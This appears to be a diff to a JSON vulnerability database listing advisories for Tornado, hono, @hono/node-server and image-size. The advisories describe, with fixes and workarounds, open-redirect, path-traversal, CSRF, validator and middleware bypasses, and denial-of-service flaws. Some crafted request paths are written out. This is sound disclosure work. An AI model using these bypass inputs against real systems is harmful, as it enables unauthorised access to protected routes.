+                    "6.2b2",
+                    "6.3",
+                    "6.3.1",
+                    "6.3.2",
+                    "6.3.3",
+                    "6.3b1",
+                    "6.4",
+                    "6.4.1",
+                    "6.4.2",
+                    "6.4b1",
+                    "6.5",
+                    "6.5.1",
+                    "6.5.10",
+                    "6.5.2",
+                    "6.5.3",
+                    "6.5.4",
+                    "6.5.5",
+                    "6.5.6",
+                    "6.5.7",
+                    "6.5.8",
+                    "6.5.9",
+                    "6.5b1",
+                    "6.6",
+                    "6.6a1",
+                    "6.6b1",
+                    "6.6rc1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126347"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-601"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T20:31:22Z",
+                "nvd_published_at": "2026-11-12T22:19:19Z",
+                "severity": "LOW"
+              },
+              "details": "### Summary\n\nDue to differences in the way browsers and Python's `urllib` parse urls, browsers treat a string starting with three or more slashes as a protocol-level redirect, while `urllib` does not. This means that the 6.6.0 fix for the RedirectHandler open redirect (CVE-2026-116578, commit cc75ab0e) is incomplete. Tornado 6.6.1 improves the open-redirect detection to handle this case correctly, as well as fixing a regression in the 6.6.0 implementation.",
+              "id": "GHSA-5cjw-f85j-cv6r",
+              "modified": "2026-11-13T20:45:03.690595670Z",
+              "published": "2026-11-13T20:31:22Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-5cjw-f85j-cv6r"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126347"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/commit/c503241622c0efe7c40110d89834ce8b7fead1e4"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/tornadoweb/tornado"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.6.1"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Tornado: Open redirect via triple-slash redirect paths"
             },
             {
               "affected": [
@@ -119064,6 +120832,26 @@
           "groups": [
             {
               "ids": [
+                "GHSA-jpvv-r467-5p4w"
+              ],
+              "aliases": [
+                "CVE-2026-126210",
+                "GHSA-jpvv-r467-5p4w"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-qv5m-9pm6-hqp3"
+              ],
+              "aliases": [
+                "CVE-2026-126343",
+                "GHSA-qv5m-9pm6-hqp3"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
                 "GHSA-rmxm-3fg6-px4f"
               ],
               "aliases": [
@@ -119074,6 +120862,175 @@
             }
           ],
           "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-jpvv-r467-5p4w/GHSA-jpvv-r467-5p4w.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@hono/node-server",
+                    "purl": "pkg:npm/%40hono/node-server"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-jpvv-r467-5p4w/GHSA-jpvv-r467-5p4w.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@hono/node-server",
+                    "purl": "pkg:npm/%40hono/node-server"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.19.18"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126210"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-436"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T21:28:02Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`@hono/node-server` passes the raw request-target to the WHATWG URL parser, which treats a backslash in the path as `/` and then resolves `..` segments. A request for `/admin\\secret` or `/public\\..\\admin/secret` reaches the application as `/admin/secret`. A reverse proxy that follows RFC 3986 forwards the backslash unchanged and applies its path-based rules to the original path, so the request reaches a route the proxy is meant to block.\n\n### Details\n\nA raw backslash is not allowed in a request-target (RFC 3986, RFC 9112 Section 3.2.1), and RFC 9112 Section 3.2 says a recipient should reject such a request rather than correct it. Proxies such as nginx on Linux, HAProxy and Envoy keep the backslash as an ordinary character, so they and the application see different paths.\n\nThe fix responds with `400 Bad Request` to a request whose path contains a raw backslash, for HTTP/1.1, HTTP/2, absolute-form request-targets and WebSocket upgrades. A percent-encoded backslash and a backslash in the query string are still accepted.\n\n### Impact\n\nAn unauthenticated client can reach a route that a reverse proxy, load balancer or WAF in front of the application blocks by path.\n\nThis affects applications served by `@hono/node-server` behind a front component that makes path-based decisions and forwards a backslash unchanged. Access control inside the Hono application, such as middleware on `/admin/*`, runs on the rewritten path and is not affected.",
+              "id": "GHSA-jpvv-r467-5p4w",
+              "modified": "2026-11-12T21:45:03.417268669Z",
+              "published": "2026-11-12T21:28:02Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/node-server"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/releases/tag/v1.19.18"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/releases/tag/v2.1.6"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "@hono/node-server: Backslash in the request path is parsed as a path separator, bypassing path-based access control at a reverse proxy"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-qv5m-9pm6-hqp3/GHSA-qv5m-9pm6-hqp3.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@hono/node-server",
+                    "purl": "pkg:npm/%40hono/node-server"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126343"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T21:32:48Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nWhile `@hono/node-server` waits for the Hono application to handle a WebSocket upgrade request, the socket has no error listener. If the client resets the TCP connection during that time, the resulting `ECONNRESET` is emitted as an unhandled `'error'` event and the process terminates.\n\n### Details\n\nThe upgrade handler awaits the application before attaching any listener to the socket. When middleware on the upgrade path does asynchronous work, such as an authentication lookup, a connection reset in that window has no handler. If a global `uncaughtException` handler swallows the error, the pending upgrade is never released and its entry is retained for the lifetime of the process.\n\nThe fix attaches error and close listeners to the socket before calling the application, releases the pending upgrade when the socket closes, and skips the handshake on a destroyed socket.\n\n### Impact\n\nAn unauthenticated client can terminate the server process with a single connection by sending a WebSocket upgrade request and resetting the connection before the application has responded. Where the crash is suppressed, repeated requests grow the heap.\n\nThis affects applications that enable WebSocket support in `@hono/node-server` and run asynchronous middleware or handlers on the upgrade path.",
+              "id": "GHSA-qv5m-9pm6-hqp3",
+              "modified": "2026-11-12T21:45:03.406890390Z",
+              "published": "2026-11-12T21:32:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/security/advisories/GHSA-qv5m-9pm6-hqp3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/commit/61cc0267e613e684401f17c27538ba3bf97339a4"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/node-server"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/node-server/releases/tag/v2.1.6"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "@hono/node-server: Unhandled `ECONNRESET` on the socket during an asynchronous WebSocket upgrade crashes the process"
+            },
             {
               "affected": [
                 {
@@ -139301,6 +141258,46 @@
           "groups": [
             {
               "ids": [
+                "GHSA-3gg2-335m-rxc6"
+              ],
+              "aliases": [
+                "CVE-2026-126359",
+                "GHSA-3gg2-335m-rxc6"
+              ],
+              "max_severity": "3.4"
+            },
+            {
+              "ids": [
+                "GHSA-46wx-v44x-9hh2"
+              ],
+              "aliases": [
+                "CVE-2026-126355",
+                "GHSA-46wx-v44x-9hh2"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-4h7h-rv7c-7m2v"
+              ],
+              "aliases": [
+                "CVE-2026-126356",
+                "GHSA-4h7h-rv7c-7m2v"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-4m76-xfj5-7975"
+              ],
+              "aliases": [
+                "CVE-2026-126357",
+                "GHSA-4m76-xfj5-7975"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
                 "GHSA-5r4p-p66f-jhc7"
               ],
               "aliases": [
@@ -139342,6 +141339,16 @@
             },
             {
               "ids": [
+                "GHSA-h7mg-cq63-vhpq"
+              ],
+              "aliases": [
+                "CVE-2026-126358",
+                "GHSA-h7mg-cq63-vhpq"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
                 "GHSA-hxh3-vqpv-xpqv"
               ],
               "aliases": [
@@ -139352,6 +141359,285 @@
             }
           ],
           "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.13.15",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-3gg2-335m-rxc6/GHSA-3gg2-335m-rxc6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "hono",
+                    "purl": "pkg:npm/hono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.12.0"
+                        },
+                        {
+                          "fixed": "4.13.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126359"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:22:36Z",
+                "nvd_published_at": null,
+                "severity": "LOW"
+              },
+              "details": "### Summary\n\nThe `css` helper in `hono/css` escapes a `/` that follows `\u003c` inside an interpolated value so that a value cannot close the `\u003cstyle\u003e` element. The check only looks inside each value. When the text before a value ends with `\u003c`, whether that is the template itself or an earlier interpolated value, and the next value starts with `/`, the `/` is not escaped and the combined output contains an unescaped closing tag.\n\n### Details\n\nInterpolated string values are escaped one at a time before they are joined with the surrounding template text. The rule that neutralizes `\u003c/` therefore cannot see a `\u003c` that belongs to the template. A template such as a `content` declaration that opens with a literal `\u003c` and interpolates a string right after it produces a raw `\u003c/style\u003e` when that string starts with `/style\u003e`. During server-side rendering the `\u003cStyle /\u003e` element is closed early and the rest of the value is interpreted as HTML.\n\nThis issue arises only when `\u003c` is the last character before an interpolation in a `css` template, either written in the template or supplied by a preceding value, and the interpolated value is controlled by a client.\n\n### Impact\n\nA client that controls such a value can inject HTML, including script, into the page rendered on the server.\n\nThis may lead to:\n\n- Execution of attacker-controlled script in the browser of a user who views the page\n- Exposure of information available to that page\n\nThis issue affects applications that interpolate untrusted strings into a `css` template immediately after a `\u003c`, including two adjacent interpolations such as `${prefix}${name}` where both are untrusted. Other uses of the `css` helper are not affected.\n\n### Workarounds\n\nDo not interpolate untrusted values into `css` templates, or make sure the text before an interpolated value does not end with `\u003c`.",
+              "id": "GHSA-3gg2-335m-rxc6",
+              "modified": "2026-11-12T23:30:03.858972167Z",
+              "published": "2026-11-12T23:22:36Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/security/advisories/GHSA-3gg2-335m-rxc6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/commit/15bbd96ad1b62a0b189db4fd8dc7bf8ef280c513"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/hono"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/releases/tag/v4.13.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Hono: `css` helper does not escape a closing tag split between the template and an interpolated value, allowing HTML injection"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-46wx-v44x-9hh2/GHSA-46wx-v44x-9hh2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "hono",
+                    "purl": "pkg:npm/hono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.13.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126355"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-352"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:31:25Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`csrf()` validates a request only when its `Content-Type` is one of the three types an HTML form can send. Chromium's hyperlink auditing (`\u003ca ping\u003e`) sends a cross-origin POST with the user's cookies and the content type `text/ping`, which is not in that list. The middleware does not look at `Origin` or `Sec-Fetch-Site` for such a request, so it is passed to the handler.\n\n### Details\n\nThe middleware skips the origin check when the content type is not one that a form submission produces. The assumption was that any other content type requires a CORS preflight and therefore cannot be sent cross-origin with credentials. Hyperlink auditing is an exception: Chrome and Edge send the ping as a credentialed POST without a preflight, with a fixed body and `Content-Type: text/ping`.\n\nA page on another origin can therefore trigger a POST to any URL of the application. The `csrf()` options for `origin` and `secFetchSite` do not change the outcome, because neither header is evaluated for the request.\n\nThe request body is fixed, so only actions whose effect does not depend on the body can be triggered. Firefox does not send pings by default. As with any CSRF, the user's cookie must be sent with the request, which with the default `SameSite=Lax` means a same-site origin or a cookie set with `SameSite=None`.\n\n### Impact\n\nA user who visits a malicious page in Chrome or Edge while logged in to an application protected by `csrf()` can be made to send a state-changing request to that application, such as logging out, deleting a resource, or toggling a setting that is selected by the path or query string.\n\nThis issue affects applications that rely on `csrf()` as their CSRF protection and expose state-changing endpoints whose effect does not depend on the request body.\n\n### Workarounds\n\nReject requests with a `Content-Type` of `text/ping` in a middleware registered before `csrf()`, or set session cookies with `SameSite=Strict`.",
+              "id": "GHSA-46wx-v44x-9hh2",
+              "modified": "2026-11-12T23:45:03.241008967Z",
+              "published": "2026-11-12T23:31:25Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/security/advisories/GHSA-46wx-v44x-9hh2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/commit/bf16471913b5199212dac33f5d170f94745dd26a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/hono"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/releases/tag/v4.13.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Hono: `csrf()` does not check requests sent by hyperlink auditing (`text/ping`)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.13.15",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-4h7h-rv7c-7m2v/GHSA-4h7h-rv7c-7m2v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "hono",
+                    "purl": "pkg:npm/hono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.5.1"
+                        },
+                        {
+                          "fixed": "4.13.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126356"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1471",
+                  "CWE-20"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:30:45Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`validator('form')` only recognizes a `multipart/form-data` `Content-Type` that carries nothing but a single `boundary` parameter. A request with another legal parameter, such as `charset`, or with extra whitespace after the `;` is not recognized as a form. The validation callback then receives an empty object, while `c.req.parseBody()` still parses the body as a form.\n\n### Details\n\nThe check that decides whether a request body is a form was written as a strict pattern over the whole `Content-Type` value. Any parameter list that does not look exactly like `; boundary=...` fails the check. When it fails, the middleware does not read the body and passes an empty object to the validation callback. If the callback accepts an empty object, the request proceeds to the handler, which can still read all submitted fields through `c.req.parseBody()` or `c.req.formData()`.\n\n`application/x-www-form-urlencoded` is not affected. Only the `multipart/form-data` branch has the strict pattern.\n\nThis issue arises when an application relies on `validator('form')` to reject or restrict fields and the validation callback does not fail on an empty object.\n\n### Impact\n\nAn unauthenticated client can send form fields that the `form` validator never sees, by adding a legal parameter to the `Content-Type` header.\n\nThis may lead to:\n\n- Allow-list or required-field checks in the validator being skipped\n- Fields the application intended to reject reaching the handler\n\nThis issue affects applications that use `validator('form')` with `multipart/form-data` requests and whose validation callback accepts an empty object.\n\n### Workarounds\n\nReject an empty object in the `validator('form')` callback, or validate the result of `await c.req.parseBody()` in the handler.",
+              "id": "GHSA-4h7h-rv7c-7m2v",
+              "modified": "2026-11-12T23:45:03.255833027Z",
+              "published": "2026-11-12T23:30:45Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/security/advisories/GHSA-4h7h-rv7c-7m2v"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/commit/d88fab372415277a9e540e895650943dd08eef4a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/hono"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/releases/tag/v4.13.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Hono: `validator('form')` skips validation for `multipart/form-data` requests with extra parameters"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-4m76-xfj5-7975/GHSA-4m76-xfj5-7975.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "hono",
+                    "purl": "pkg:npm/hono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.13.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126357"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-288"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:24:11Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`mount()` and `app.mount()` remove the mount prefix from the request path and forward the rest to the mounted application. Two mistakes in that step let a crafted request reach a route of the mounted application that the outer application protects with path-scoped middleware, such as an authentication check on `/app/admin/*`. The outer application routes on the original path, so the middleware does not run.\n\n### Details\n\n1. **Dynamic prefix** (all affected versions): for a mount such as `/api/:tenant/*`, the prefix was removed by the length of the route pattern, not of the matched prefix. A request with a longer or shorter first segment is cut in the middle, so `/api/a/xxxxx/admin/secret` reaches the mounted application as `/admin/secret`.\n2. **Re-normalization** (since 4.12.21): the forwarded path was built from the decoded request path and assigned to `url.pathname`, which turns a decoded backslash into `/` and collapses `..`. `/app/public%5C..%5Cadmin/secret` reaches the mounted application as `/admin/secret`.\n\nThe fix removes the prefix segment by segment from the raw pathname, using the matched parameter values for its length. Route patterns that cannot be handled safely now throw: duplicate parameter names and a wildcard inside the last segment such as `/assets*`. A trailing slash in an `app.mount()` prefix no longer removes an extra segment.\n\n### Impact\n\nAn unauthenticated client can reach a route of a mounted application that the outer application protects with path-scoped middleware.\n\nThis affects applications that use `mount()` or `app.mount()` and rely on middleware registered on a sub-path inside the mount prefix for authentication or authorization.\n\n### Workarounds\n\nRegister the authentication middleware inside the mounted application.",
+              "id": "GHSA-4m76-xfj5-7975",
+              "modified": "2026-11-12T23:30:03.867783771Z",
+              "published": "2026-11-12T23:24:11Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/security/advisories/GHSA-4m76-xfj5-7975"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/commit/34f90432a1794b28e52802670efcd01963f716d6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/hono"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/releases/tag/v4.13.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Hono: `mount()` and `app.mount()` can forward a path that bypasses middleware scoped inside the mount prefix"
+            },
             {
               "affected": [
                 {
@@ -139644,6 +141930,76 @@
                 }
               ],
               "summary": "Hono: Incomplete fix for CVE-2026-39408: `toSSG()` still writes files outside the output directory"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.13.15",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-h7mg-cq63-vhpq/GHSA-h7mg-cq63-vhpq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "hono",
+                    "purl": "pkg:npm/hono"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.1.4"
+                        },
+                        {
+                          "fixed": "4.13.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126358"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-863"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:23:30Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nRegExpRouter, which the default `SmartRouter` selects for most applications, skipped wildcard middleware in three cases, so a route handler ran without the middleware registered for it:\n\n1. Middleware whose parameter is written with the explicit default pattern, such as `/api/:tenant{[^/]+}/admin/*`, was not applied to a route written as `/api/:tenant/admin/:id`. (since 4.13.0)\n2. Middleware on `/admin/*` was not applied to a route registered on `/admin*` for paths under `/admin/`. (since 4.1.4)\n3. For a path with an encoded line terminator (`%0A`, `%0D`, `%E2%80%A8`, `%E2%80%A9`), no wildcard pattern matched, so the request reached the not-found handler without any wildcard middleware. (since 4.4.0)\n\nTrieRouter, LinearRouter and PatternRouter apply the middleware in all three cases.\n\n### Details\n\nRegExpRouter decides at registration time which wildcard middleware covers which route. In cases 1 and 2 it treated patterns that match the same requests as different ones. In case 3 the compiled wildcard did not match line terminators.\n\nThe fix derives the coverage from the structure of the registered paths and lets wildcards match line terminators. It also corrects other differences from the other routers (a wildcard in the middle of a path with parameters, duplicate middleware, middleware on static routes), and rejects custom patterns that can match the empty string, such as `{[0-9]*}`, with `UnsupportedPathError`. `PreparedRegExpRouter` data must be regenerated.\n\n### Impact\n\nAn unauthenticated client can reach a route handler, or the not-found handler, without the authentication or authorization middleware registered on a wildcard path.\n\nThis affects applications that use RegExpRouter, directly or through the default `SmartRouter`, and rely on wildcard middleware for authentication or authorization.\n\n### Workarounds\n\nUse `new Hono({ router: new TrieRouter() })`.",
+              "id": "GHSA-h7mg-cq63-vhpq",
+              "modified": "2026-11-12T23:30:03.867508007Z",
+              "published": "2026-11-12T23:23:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/security/advisories/GHSA-h7mg-cq63-vhpq"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/commit/8a103aa59bcfbffd5396b1548a0dff3688777c36"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/honojs/hono"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/honojs/hono/releases/tag/v4.13.16"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Hono: RegExpRouter skips wildcard middleware for some route sets and for paths with an encoded line terminator"
             },
             {
               "affected": [
@@ -140114,7 +142470,195 @@
             "name": "image-size",
             "version": "2.0.2",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5p2g-fcmc-qvqq"
+              ],
+              "aliases": [
+                "CVE-2025-71329",
+                "GHSA-5p2g-fcmc-qvqq"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-w3rx-r6r6-pgpr"
+              ],
+              "aliases": [
+                "CVE-2025-71330",
+                "GHSA-w3rx-r6r6-pgpr"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.0.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-5p2g-fcmc-qvqq/GHSA-5p2g-fcmc-qvqq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "image-size",
+                    "purl": "pkg:npm/image-size"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.2.0"
+                        },
+                        {
+                          "fixed": "2.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-71329"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-08-07T20:54:40Z",
+                "nvd_published_at": "2026-06-10T14:16:30Z",
+                "severity": "HIGH"
+              },
+              "details": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.",
+              "id": "GHSA-5p2g-fcmc-qvqq",
+              "modified": "2026-09-24T18:45:10.915244487Z",
+              "published": "2026-06-10T15:31:30Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71329"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/image-size/image-size"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
